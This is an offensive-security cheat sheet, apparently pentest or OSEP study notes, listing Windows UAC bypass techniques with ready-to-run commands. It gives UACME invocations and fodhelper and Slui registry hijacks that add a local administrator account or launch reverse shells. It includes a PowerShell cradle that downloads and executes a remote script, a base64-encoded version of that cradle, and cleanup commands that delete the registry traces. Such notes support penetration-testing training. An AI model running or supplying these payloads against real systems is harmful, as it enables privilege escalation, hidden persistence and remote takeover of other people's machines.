---
description: Common UAC Bypass Checklists
---

# UAC Bypass

A UAC bypass is a method to circumvent User Account Control, a security feature in Windows that asks for confirmation before making major changes. Bypasses typically trick trusted programs into running malicious code with high privileges.

### UACME

* [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)
* [https://github.com/yuyudhn/UACME-bin](https://github.com/yuyudhn/UACME-bin)

{% code overflow="wrap" %}
```powershell
# Add new user
Akagi64.exe 61 "net user asuka asuk@1337 /add"
# Reverse shell
Akagi64.exe 61 "E:\Exploits\shell.exe"
```
{% endcode %}

### Fodhelper

Run at Powershell.

* Add New Administrator

{% code overflow="wrap" %}
```powershell
# Add user "asuka"
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force; New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force; Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "net user asuka asuk@1337 /add" -Force; Start-Process "C:\Windows\System32\fodhelper.exe"
# Add asuka to Local Administrator
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force; New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force; Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "net localgroup Administrators asuka /add" -Force; Start-Process "C:\Windows\System32\fodhelper.exe"

# Delete registry value
reg delete HKCU\Software\Classes\ms-settings\ /f
```
{% endcode %}

* Reverse shell

reverse-shell.ps1

{% code overflow="wrap" %}
```powershell
powershell.exe -NoP -ExecutionPolicy Bypass -Command "iex ((New-Object Net.WebClient).DownloadString('http://172.16.8.1/OSEP/research/reverse-shell.ps1'))"
```
{% endcode %}

Convert to Base64 with UTF-16LE char encode.

{% code overflow="wrap" %}
```bash
cat reverse-shell.ps1 | iconv -t UTF-16LE | base64 -w0
```
{% endcode %}

Final Fodhelper payload:

{% code overflow="wrap" %}
```powershell
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force; New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force; Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "powershell.exe -Enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0AQwBvAG0AbQBhAG4AZAAgACIAaQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADgALgAxAC8ATwBTAEUAUAAvAHIAZQBzAGUAYQByAGMAaAAvAHIAZQB2AGUAcgBzAGUALQBzAGgAZQBsAGwALgBwAHMAMQAnACkAKQAiAAoA" -Force; Start-Process "C:\Windows\System32\fodhelper.exe"
```
{% endcode %}

Delete registry value after command executed:

{% code overflow="wrap" %}
```powershell
reg delete HKCU\Software\Classes\ms-settings\ /f
```
{% endcode %}

### Slui File Handler Hijack LPE

* [https://bytecode77.com/slui-file-handler-hijack-privilege-escalation](https://bytecode77.com/slui-file-handler-hijack-privilege-escalation)
* [https://github.com/gushmazuko/WinBypass/blob/master/SluiHijackBypass.ps1](https://github.com/gushmazuko/WinBypass/blob/master/SluiHijackBypass.ps1)

{% code overflow="wrap" %}
```powershell
powershell -ep bypass
. .\SluiHijackBypass.ps1
SluiHijackBypass -command "cmd.exe" -arch 64
# or
SluiHijackBypass "C:\xampp\htdocs\reverse-shell.exe"
```
{% endcode %}
